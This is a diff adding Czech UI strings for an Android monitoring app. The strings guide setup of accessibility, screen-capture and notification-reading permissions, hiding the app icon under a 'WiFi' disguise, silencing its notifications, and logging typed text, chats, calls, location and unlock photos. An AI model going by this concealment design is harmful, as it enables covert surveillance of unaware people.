@@ -1,0 +1,337 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="abc_action_bar_home_description">Přejít na plochu</string>
+    <string name="abc_action_bar_up_description">Přejít nahoru</string>
+    <string name="abc_action_menu_overflow_description">Více možností</string>
+    <string name="abc_action_mode_done">Hotovo</string>
+    <string name="abc_activity_chooser_view_see_all">Zobrazit vše</string>
+    <string name="abc_activitychooserview_choose_application">Vybrat aplikaci</string>
+    <string name="abc_capital_off">VYPNUTO</string>
+    <string name="abc_capital_on">ZAPNUTO</string>
+    <string name="abc_menu_alt_shortcut_label">Alt+</string>
+    <string name="abc_menu_ctrl_shortcut_label">Ctrl+</string>
+    <string name="abc_menu_delete_shortcut_label">delete</string>
+    <string name="abc_menu_enter_shortcut_label">enter</string>
+    <string name="abc_menu_function_shortcut_label">Fn+</string>
+    <string name="abc_menu_meta_shortcut_label">Meta+</string>
+    <string name="abc_menu_shift_shortcut_label">Shift+</string>
+    <string name="abc_menu_space_shortcut_label">mezerník</string>
+    <string name="abc_menu_sym_shortcut_label">Sym+</string>
+    <string name="abc_prepend_shortcut_label">Menu+</string>
+    <string name="abc_search_hint">Vyhledat…</string>
+    <string name="abc_searchview_description_clear">Smazat dotaz</string>
+    <string name="abc_searchview_description_query">Vyhledávací dotaz</string>
+    <string name="abc_searchview_description_search">Hledat</string>
+    <string name="abc_searchview_description_submit">Odeslat dotaz</string>
+    <string name="abc_searchview_description_voice">Hlasové vyhledávání</string>
+    <string name="abc_shareactionprovider_share_with">Sdílet pomocí</string>
+    <string name="abc_shareactionprovider_share_with_application">Sdílet s aplikací %s</string>
+    <string name="abc_toolbar_collapse_description">Sbalit</string>
+    <string name="app_log_name">Apps</string>
+    <string name="check">Odinstalovat starou verzi zde</string>
+    <string name="date_format_full">d. M. yyyy</string>
+    <string name="date_format_short">d. M.</string>
+    <string name="dialog_allow_unknown_source">Pro aktualizaci aplikaci povolte „Nainstalovat neznámé aplikace“.</string>
+    <string name="dialog_battery_optim">Chcete-li, aby aplikace fungovala správně, vypněte prosím Optimalizovat využití baterie</string>
+    <string name="dialog_battery_optim_on">Optimalizace využití baterie je stále povolena!</string>
+    <string name="dialog_battery_optim_set">":
+ - Změňte položku \"Neoptimalizováno\" na \"Všechny aplikace\"
+ - Najděte a vypněte aplikaci \"%1$s\"
+ - Klepněte na tlačítko \"Zpět\""</string>
+    <string name="dialog_no">Ne</string>
+    <string name="dialog_ok">OK</string>
+    <string name="dialog_perm_accessibility">Povolte prosím službu dostupnosti aplikací</string>
+    <string name="dialog_perm_accessibility_on">Služba usnadnění přístupu k aplikacím je stále zakázána!</string>
+    <string name="dialog_perm_app">"Aktivujte prosím všechna oprávnění aplikace:
+ - Otevřete položku \"Oprávnění\"
+ - Aktivujte všechna oprávnění"</string>
+    <string name="dialog_perm_app_off">Některá oprávnění k aplikaci jsou stále deaktivována!</string>
+    <string name="dialog_perm_notif">Zakažte oznámení aplikací</string>
+    <string name="dialog_perm_notif_on">Oznámení aplikací jsou stále povolena!</string>
+    <string name="dialog_perm_overlay">Chcete-li získat screenshoty a odemknout selfie, aktivujte povolení \"Překrytí\"</string>
+    <string name="dialog_perm_overlay_off">Oprávnění \"Překrytí\" je stále zakázáno!</string>
+    <string name="dialog_perm_read_notif">Povolte aplikaci %1$s číst oznámení</string>
+    <string name="dialog_perm_read_notif_off">Přístup k oznámením o přečtení je stále zakázán!</string>
+    <string name="dialog_perm_scr">"Chcete-li získat screenshoty, povolte %1$s, aby zachytila obrazovku:
+ - Povolte položku \"Nezobrazovat znovu\"
+ - Klepněte na tlačítko \"Spustit\""</string>
+    <string name="dialog_perm_scr_off">Snímání obrazovky je stále zakázáno!</string>
+    <string name="dialog_perm_usage">"Chcete-li získat screenshoty, aktivujte povolení \"Přístup k datům o použití\":
+ - Najděte a klepněte na aplikaci \"%1$s\"
+ - Povolte přístup k použití
+ - Dvakrát klepněte na tlačítko \"Zpět\""</string>
+    <string name="dialog_perm_usage_off">\"Přístup k datům o použití\" je stále zakázáno!</string>
+    <string name="dialog_pin_current">Aktuální PIN</string>
+    <string name="dialog_pin_retype">Znovu zadejte PIN</string>
+    <string name="dialog_pin_specify">Nový PIN</string>
+    <string name="dialog_run_app">Otevření skryté aplikace pomocí číselníku:</string>
+    <string name="dialog_run_app_sticker">Chcete-li otevřít skrytou aplikaci, použijte widget \"Nálepka\"</string>
+    <string name="dialog_uninstall_ask">Chcete odinstalovat Monitorování?</string>
+    <string name="dialog_update">Aktualizovat</string>
+    <string name="dialog_wait">Prosím, čekejte…</string>
+    <string name="dialog_yes">Ano</string>
+    <string name="email_msg_alarm">Předplatné vyprší po %1$s.</string>
+    <string name="email_msg_alarm_renew">"
+Obnovte prosím předplatné."</string>
+    <string name="email_msg_alarm_stop">Platnost předplatného vypršela.</string>
+    <string name="email_msg_alarm_stop_logs">Placené přehledy budou zahozeny, pokud nezačnete předplatné.</string>
+    <string name="event_count">Počet</string>
+    <string name="event_name">Událost</string>
+    <string name="general_password">Zadejte svůj PIN</string>
+    <string name="global_settings_name">Nastavení</string>
+    <string name="gm_now">Teď</string>
+    <string name="hint_change_pin_new">Zadejte nový PIN</string>
+    <string name="hint_enter_pin">Zadejte PIN</string>
+    <string name="hint_sms_hiden">[Skryté]</string>
+    <string name="ignore">Přeskočit tento krok</string>
+    <string name="im_log_name">M</string>
+    <string name="inst_accessibility_activate_action">ZAPNĚTE SLUŽBU</string>
+    <string name="inst_accessibility_browsers_list">Chrome, Opera, Firefox, Samsung, Mint, ASUS</string>
+    <string name="inst_accessibility_caption">Vyberte další aktivity ke sledování</string>
+    <string name="inst_accessibility_chats">Chaty</string>
+    <string name="inst_accessibility_chats_list">WhatsApp, Facebook Messenger, Viber, Hangouts</string>
+    <string name="inst_accessibility_hint">"Chcete-li mít přístup k obsahu obrazovky, musíte aktivovat službu usnadnění přístupu:
+Vyberte v seznamu aplikaci '%1$s' a povolte ji. Vraťte se na tuto stránku. (Systém může v tuto chvíli aplikaci ukončit)"</string>
+    <string name="inst_accessibility_sites">Historie webových stránek</string>
+    <string name="inst_call_recording">Telefonní záznamy</string>
+    <string name="inst_chat_recording">Záznamy chatů</string>
+    <string name="inst_chose_device_type">Vyberte typ zařízení</string>
+    <string name="inst_enable_location_access">"Aplikace vyžaduje přístup k poloze:\\n\\n1. Najděte a klepněte na nastavení \\'Oprávnění\\'.\\n2. Najděte a klepněte na nastavení \\'Poloha\\'.\\n3. Povolit: \\'Povolit vždy\\'"</string>
+    <string name="inst_finish_action">Dokončit instalaci</string>
+    <string name="inst_finish_caption">Konfigurace dokončena</string>
+    <string name="inst_finish_hint">"Instalace dokončena!
+Zobrazit protokoly ve vašem účtu."</string>
+    <string name="inst_hello_cancel">Zrušit instalaci</string>
+    <string name="inst_hello_caption">Jak umožnit sledování tohoto zařízení</string>
+    <string name="inst_hello_hint">Pokud chcete toto zařízení sledovat, musíte provést všechny kroky konfigurace. Ujistěte se, že máte zaregistrovaný účet a stiskněte tlačítko DALŠÍ.</string>
+    <string name="inst_license_caption">Licenční smlouva s koncovým uživatelem</string>
+    <string name="inst_log_select_all">Všechny aktivity</string>
+    <string name="inst_log_select_apps">Apps</string>
+    <string name="inst_log_select_calendar">Kalendář</string>
+    <string name="inst_log_select_calls">Protokoly volání</string>
+    <string name="inst_log_select_caption">Činnosti zařízení ke sledování</string>
+    <string name="inst_log_select_contacts">Kontakty</string>
+    <string name="inst_log_select_gallery">Galerie</string>
+    <string name="inst_log_select_hint">Pokud některé možnosti nezaškrtnete, nebudete je moci dálkově zapnout. Budete potřebovat fyzický přístup k zařízení.</string>
+    <string name="inst_log_select_location">Umístění</string>
+    <string name="inst_log_select_sms">SMS/MMS</string>
+    <string name="inst_log_select_system">Systémové události</string>
+    <string name="inst_log_select_system_hint">(SIM, baterie, informace o sítích)</string>
+    <string name="inst_log_select_unlock">Vyfotit při odemčení</string>
+    <string name="inst_log_typed_text">Zadaný text</string>
+    <string name="inst_login_activate">Aktivovat</string>
+    <string name="inst_login_caption">Zadejte prosím své přihlašovací údaje</string>
+    <string name="inst_login_forgot_password">Zapomenuté heslo?</string>
+    <string name="inst_login_hint_email">Zadejte e-mail</string>
+    <string name="inst_login_hint_password">Zadejte heslov</string>
+    <string name="inst_old_version_found">Chcete-li se vyhnout chybám, odinstalujte prosím následující staré verze:</string>
+    <string name="inst_pin_caption">Nastavte svůj PIN</string>
+    <string name="inst_pin_change">Změňte PIN</string>
+    <string name="inst_pin_change_hint">PIN</string>
+    <string name="inst_pin_change_icon">Systém Android omezuje skrývání ikon aplikací. Aplikace se v zařízení zobrazí pod ikonou \"WiFi\".</string>
+    <string name="inst_pin_hide_app">Skryjte ikonu aplikace</string>
+    <string name="inst_pin_hint">Aplikaci lze spustit vytočením ***%1$s###</string>
+    <string name="inst_pin_turn_on">Chraňte aplikaci pomocí PIN</string>
+    <string name="inst_rec_warning">U některých modelů telefonů s Androidem nemusí být hovory správně zaznamenány</string>
+    <string name="inst_requiremens_a11y">Služba usnadnění přístupu</string>
+    <string name="inst_requiremens_a11y_hint">Služba usnadnění přístupu je vyžadována pro poskytování rozšířených monitorovacích funkcí.</string>
+    <string name="inst_requiremens_a11y_instruction">"1. Klepněte na Instalované (stažené) služby.
+ 2. Klepněte na '%1$s'.
+ 3. Zapněte přepínač a klepněte na Povolit.
+ 4. Klikejte na systémové tlačítko ZPĚT dokud se nevrátíte na tuto stránku."</string>
+    <string name="inst_requiremens_a11y_instruction_14">"
+
+ Pokud je aktivace služby zablokována, otevřete Nastavení>Aplikace>'%1$s', vyhledejte položku \"Povolit omezená nastavení\" a zapněte ji. Pokud v nastavení není, klikněte na 3 tečky v pravém horním rohu, zapněte jej a poté zopakujte aktivaci služby."</string>
+    <string name="inst_requiremens_a11y_instruction_header">Aktivace služby usnadnění přístupu:</string>
+    <string name="inst_requiremens_basic">Základní oprávnění</string>
+    <string name="inst_requiremens_basic_hint">Aplikace vyžaduje přístup k úložišti, nastavení telefonu, protokolům hovorů a kontaktům.</string>
+    <string name="inst_requiremens_basic_instruction">"1. Vyhledejte nastavení 'Oprávnění' a klepněte na něj.
+
+2. Umožněte přístup k následujícím:
+\u0009- Kontakty
+\u0009- Telefon
+\u0009- Úložný prostor
+
+3. Klikejte na systémové tlačítko ZPĚT, dokud se nevrátíte na tuto stránku."</string>
+    <string name="inst_requiremens_basic_instruction_26">"1. Najděte a klepněte na nastavení 'Oprávnění'.
+
+2. Umožněte přístup k následujícím:
+\u0009- Protokoly hovorů
+\u0009- Kontakty
+\u0009- Telefon
+\u0009- Úložný prostor
+
+3. Klikejte na systémové tlačítko ZPĚT, dokud se nevrátíte na tuto stránku."</string>
+    <string name="inst_requiremens_basic_instruction_header">Povolení oprávnění:</string>
+    <string name="inst_requiremens_battery">Zakažte optimalizaci baterie</string>
+    <string name="inst_requiremens_battery_hint">Nechte aplikaci vždy běžet na pozadí (Optimalizace baterie VYPNUTO), abyste zabránili zastavení aplikace z důvodu úspory baterie</string>
+    <string name="inst_requiremens_caption">Požadavky na aplikaci</string>
+    <string name="inst_requiremens_everything_ready">Skoro hotovo! Ještě pár kroků!</string>
+    <string name="inst_requiremens_files_access_header">Chcete-li povolit přístup k úložišti:</string>
+    <string name="inst_requiremens_files_access_instruction">1. Procházejte seznamem, dokud neuvidíte aplikaci <b>"'%1$s'"</b>".
+
+2. "<b>Zapněte</b>" přepínač pro udělení oprávnění.
+
+3. Klepněte na systémové tlačítko "<b>ZPĚT</b>, dokud se nevrátíte na tuto stránku.</string>
+    <string name="inst_requiremens_hint">Povolte prosím všechny uvedené možnosti, aby aplikace fungovala správně</string>
+    <string name="inst_requiremens_notifications">Zakažte oznámení aplikace</string>
+    <string name="inst_requiremens_notifications_access">Přístup k oznámením</string>
+    <string name="inst_requiremens_notifications_access_hint">Toto oprávnění umožňuje číst oznámení.</string>
+    <string name="inst_requiremens_notifications_access_instruction">1. Procházejte seznamem, dokud neuvidíte aplikaci <b>\"%1$s\"</b>". 
+
+2. "<b>Zapněte</b>" přepínač pro udělení oprávnění. 
+
+3. "<b>Klepněte na</b> <b>Povolit</b>". 
+
+4. Klepněte na systémové tlačítko "<b>ZPĚT</b>, dokud se nevrátíte na tuto stránku.</string>
+    <string name="inst_requiremens_notifications_access_instruction_header">Chcete-li povolit přístup k oznámením:</string>
+    <string name="inst_requiremens_notifications_hint">Oznámení z této aplikace by měla být vypnuta, protože mohou být příliš obtěžující.</string>
+    <string name="inst_requiremens_notifications_instruction">"1. Vyhledejte a klepněte na nastavení 'Oznámení'.
+
+2. "<b>VYPNĚTE</b>" hlavní přepínač.
+
+3. Klikejte na systémové tlačítko "<b>ZPĚT</b> dokud se nevrátíte na tuto stránku.</string>
+    <string name="inst_requiremens_notifications_instruction_26">1. <b>VYPNĚTE</b>" přepínač 'Zobrazovat oznámení'.
+
+2. Klepnutím na systémové tlačítko "<b>ZPĚT</b> se vrátíte na tuto stránku.</string>
+    <string name="inst_requiremens_notifications_instruction_header">Postup deaktivace oznámení z této aplikace:</string>
+    <string name="inst_requiremens_overlay">Povolení k překrytí</string>
+    <string name="inst_requiremens_overlay_hint">Aplikace by se měla být schopna zobrazit přes jiné aplikace.</string>
+    <string name="inst_requiremens_usage">Přístup k použití</string>
+    <string name="inst_requiremens_usage_hint">Toto oprávnění umožňuje sledovat aktivitu jiných aplikací.</string>
+    <string name="inst_requiremens_usage_instruction">1. Listujte seznamem, dokud neuvidíte aplikaci <b>"'%1$s'"</b>".
+
+2. "<b>Klepněte</b>" na aplikaci.
+
+3. Chcete-li udělit oprávnění, "<b>zapněte</b>" přepínač.
+
+4. Klikejte na systémové tlačítko "<b>ZPĚT</b> dokud se nevrátíte na tuto stránku.</string>
+    <string name="inst_requiremens_usage_instruction_header">Povolení přístupu k použití:</string>
+    <string name="inst_screenshots_caption">Jaké typy screenshotů chcete zaznamenat?</string>
+    <string name="inst_screenshots_hint">"Musíte aplikaci povolit pořizovat screenshoty bez budoucích potvrzení. Zaškrtněte políčko 'Nezobrazovat znovu' v dialogovém okně s žádostí o oprávnění a stiskněte tlačítko ZAČÍT TEĎ."</string>
+    <string name="inst_screenshots_im">Messengerů</string>
+    <string name="inst_screenshots_sms">SMS/MMS</string>
+    <string name="inst_screenshots_timer">Načasované, aktuální aktivita</string>
+    <string name="inst_screenshots_title">Screenshoty:</string>
+    <string name="inst_screenshots_web">Webových prohlížečů</string>
+    <string name="inst_type_caption">Potvrďte, že tato aplikace bude použita v souladu s určením použití</string>
+    <string name="inst_type_confirmation">Potvrzuji, že uživatel tohoto zařízení je informován o monitorovacím softwaru a mám jeho výslovný souhlas</string>
+    <string name="inst_type_employee">Zařízení zaměstnance</string>
+    <string name="inst_type_intention">Tento software budu používat ke sledování:</string>
+    <string name="inst_type_kids">Zařízení mého dítěte</string>
+    <string name="inst_type_own">Mého vlastního zařízení</string>
+    <string name="license_accept">Přijímám</string>
+    <string name="license_read">Přečetl(a) jsem si podmínky</string>
+    <string name="license_text"><b>1.</b>" Jste si vědomi, že tento software může zaznamenávat, ukládat a přenášet informace o využití zařízení a jeho uživatelské činnosti. 
+ 
+"<b>2.</b>" Tento software můžete používat pouze za následujících podmínek: 
+Tento software používáte na zařízení, které vlastníte a osobně používáte; 
+Máte výslovný písemný souhlas vlastníka a všech uživatelů sledovaného zařízení; 
+Jste zákonným zástupcem uživatele sledovaného zařízení; 
+ 
+"<b>3.</b> Znáte a dodržujete zákony a předpisy, které se týkají soukromí, důvěrnosti a používání takového monitorovacího softwaru ve vaší jurisdikci. Přebíráte plnou odpovědnost za instalaci nebo používání softwaru. Vývojáři, prodejci ani distributoři softwaru nemohou nést odpovědnost za jakékoli právní porušení nebo důsledky, které vyplývají z instalace nebo používání softwaru.</string>
+    <string name="log_files_name">Galerie</string>
+    <string name="log_name_audio">Audio</string>
+    <string name="log_name_file">Soubor</string>
+    <string name="log_name_gif">Gif</string>
+    <string name="log_name_image">Obrázek</string>
+    <string name="log_name_sticker">Nálepka</string>
+    <string name="log_name_video">Video</string>
+    <string name="menu_change_email">Změnit nastavení e-mailu</string>
+    <string name="menu_change_pin">Změnit PIN aplikace</string>
+    <string name="menu_check_app_state">Zkontrolujte oprávnění aplikace</string>
+    <string name="menu_check_update">Kontrola aktualizací</string>
+    <string name="menu_clear">Vymazat místní protokoly</string>
+    <string name="menu_close">Zavřít</string>
+    <string name="menu_disable_pin_protection">Zakázat ochranu PIN</string>
+    <string name="menu_enable_pin_protection">Povolit ochranu PIN</string>
+    <string name="menu_hide_icon">Skrýt ikonu %1$s</string>
+    <string name="menu_reset_app_perm">Resetovat oprávnění aplikace</string>
+    <string name="menu_reset_license">Obnovit licenci</string>
+    <string name="menu_select_source">Změňte zdroj zvuku</string>
+    <string name="menu_show_icon">Zobrazit ikonu %1$s</string>
+    <string name="menu_uninstall">Odinstalovat</string>
+    <string name="module_calendar">Události kalendáře</string>
+    <string name="module_calls">Volání</string>
+    <string name="module_contacts">Kontakty</string>
+    <string name="module_files">Soubory</string>
+    <string name="module_location">Umístění</string>
+    <string name="module_mms">MMS</string>
+    <string name="module_photo">Vyfotit při selfi</string>
+    <string name="module_screen_shot">Screenshoty</string>
+    <string name="module_sim">Výměna SIM karty</string>
+    <string name="module_sms">SMS</string>
+    <string name="module_web">Navštívené webové stránky</string>
+    <string name="next">další</string>
+    <string name="search_menu_title">Hledat</string>
+    <string name="skype_call">VYZVÁNĚNÍ</string>
+    <string name="skype_call_cancel">Zavřít</string>
+    <string name="skype_call_conn">PŘIPOJOVÁNÍ</string>
+    <string name="skype_call_end">Ukončit hovor</string>
+    <string name="skype_start">"Přehrát zvukovou zprávu, "</string>
+    <string name="skype_stop">Pozastavit zvukové zprávy</string>
+    <string name="status_Version">Verze aplikace:</string>
+    <string name="status_activated">Aktivace</string>
+    <string name="status_bar_notification_info_overflow">999+</string>
+    <string name="status_internet_connection">Žádné internetové připojení</string>
+    <string name="status_last_send">Poslední nahrání dat:</string>
+    <string name="status_last_sync">Poslední připojení:</string>
+    <string name="status_memory_usage">Využití paměti</string>
+    <string name="status_monitor_disabled">Monitor zakázán</string>
+    <string name="status_monitor_enabled">Monitor povolen</string>
+    <string name="status_record">Záznam</string>
+    <string name="status_send_data_period">Období nahrávání dat</string>
+    <string name="status_server_connected">Připojeno</string>
+    <string name="status_valid">platné do</string>
+    <string name="status_wifi">pouze Wi-Fi</string>
+    <string name="telegram_date_format_full">d. MMM, yyyy</string>
+    <string name="telegram_date_format_short">d. MMM</string>
+    <string name="telegram_got">Přijato v</string>
+    <string name="telegram_got_ans1">Má</string>
+    <string name="telegram_got_ans2">odpovědi</string>
+    <string name="telegram_loaded">Staženo</string>
+    <string name="telegram_pause">Pauza</string>
+    <string name="telegram_sending">Posílám</string>
+    <string name="telegram_sent">Odesláno v</string>
+    <string name="telegram_video">Video</string>
+    <string name="telegram_viewed">Zobrazeno</string>
+    <string name="telegram_voice">Hlasová zpráva</string>
+    <string name="text_log_name">Napsaný text</string>
+    <string name="time_day">d.</string>
+    <string name="time_hrs">h.</string>
+    <string name="time_min">m.</string>
+    <string name="time_sec">s.</string>
+    <string name="title_activity_installer">Instalační program</string>
+    <string name="toast_digit_pin">PIN musí obsahovat pouze číslice</string>
+    <string name="toast_empty_email">Zadejte e-mail účtu</string>
+    <string name="toast_empty_password">Zadejte heslo účtu</string>
+    <string name="toast_empty_pin">Zadejte PIN aplikace</string>
+    <string name="toast_error_activation">Chyba aktivace</string>
+    <string name="toast_hide_icon">Ikona %1$s bude po ukončení aplikace skrytá.</string>
+    <string name="toast_length_pin">PIN musí obsahovat pouze 4 číslice</string>
+    <string name="toast_license_limit">chyba licence.</string>
+    <string name="toast_license_locked">licence uzamčena.</string>
+    <string name="toast_logs_cleared">Místní protokoly byly úspěšně vymazány</string>
+    <string name="toast_no_inet">Zkontrolujte připojení k internetu</string>
+    <string name="toast_not_same_pin">PIN kódy se neshodují</string>
+    <string name="toast_pin_changed">PIN byl úspěšně změněn</string>
+    <string name="toast_reset_app_perms">Obě oprávnění jsou již deaktivována</string>
+    <string name="toast_server_not_available">Server není k dispozici. Zkontrolujte připojení k internetu nebo to zkuste znovu později.</string>
+    <string name="toast_show_icon">Ikona %1$s bude po ukončení aplikace viditelná.</string>
+    <string name="toast_unkn_err">neznámá chyba:</string>
+    <string name="toast_wrong_account_or_password">Chybný e-mail nebo heslo k účtu.</string>
+    <string name="toast_wrong_pin">Nesprávný PIN</string>
+    <string name="update_current_version">Aktuální verze: %1$s</string>
+    <string name="update_new_version">Nová verze: %1$s</string>
+    <string name="update_status_error_disable_link">Aktualizační odkaz není k dispozici. Prosím zkuste to znovu později</string>
+    <string name="update_status_error_disable_server">Server není k dispozici. Zkontrolujte připojení k internetu</string>
+    <string name="update_status_error_download">Při načítání aktualizací došlo k chybě</string>
+    <string name="update_status_ok_check_link">Ověření aktualizačního odkazu</string>
+    <string name="update_status_ok_check_server">Ověření přístupu na server.</string>
+    <string name="update_status_ok_download_update">Stahování aktualizací…</string>
+    <string name="update_status_ok_install">Instalace aktualizací…</string>
+    <string name="viber_change">Upravit</string>
+    <string name="widget_enter_note">Zadejte text</string>
+    <string name="widget_hint">Klepnutím zadáte text</string>
+    <string name="widget_name">Nálepka</string>
+</resources>
